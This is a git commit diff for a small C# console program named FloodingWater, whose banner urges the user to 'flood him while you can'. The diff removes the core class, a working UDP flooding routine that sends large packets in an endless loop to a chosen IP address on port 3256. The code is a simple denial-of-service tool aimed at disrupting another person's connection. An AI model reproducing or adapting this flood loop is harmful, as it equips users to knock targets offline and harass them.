2129b4699bcb83c1e4d6d56b8a5f5628d64a5402
mrkoolaid <mrkoolaid@protonmail.com>
2016-10-22 10:54:24 -0700

    first publish

--- FloodingWater/FloodingWater/Program.cs
+++ FloodingWater/FloodingWater/Program.cs
@@ -2,12 +2,6 @@
 ///
 
 using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Net.Sockets;
-using System.Text;
-using System.Net;
-using System.Threading;
 
 namespace FloodingWater
 {
@@ -69,53 +63,6 @@ namespace FloodingWater
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.\nHow to use:");
             Console.WriteLine("\tWrite 'Q' to quit.\n");
-        }
-    }
-
-    class FloodingWater
-    {
-        private Thread t;
-
-        public FloodingWater(string ip, int pbytes)
-        {
-            t = new Thread(() => this.Flood(ip, pbytes, false));
-            t.Start();
-        }
-
-        /// <summary>
-        /// Flood method
-        /// </summary>
-        /// <param name="ip">IP address to flood</param>
-        /// <param name="size">Size of the packet</param>
-        public void Flood(string ip, int size, bool upnp)
-        {
-            int count = 0, port = 3256;
-            IPEndPoint ep;
-
-            while (true)
-            {
-                try
-                {
-                    byte[] pbytes = new byte[size * 1024];
-                    
-                    ep = new IPEndPoint(IPAddress.Parse(ip), port);
-
-                    SocketType st = SocketType.Dgram;
-                    ProtocolType pt = ProtocolType.Udp;
-
-                    Socket sock = new Socket(AddressFamily.InterNetwork, st, pt);
-                    sock.SendTo(pbytes, ep);
-                    count++;
-
-                    Console.Clear();
-                    Console.WriteLine("Sent {0} packets!", count);
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                    break;
-                }
-            }
         }
     }
 }
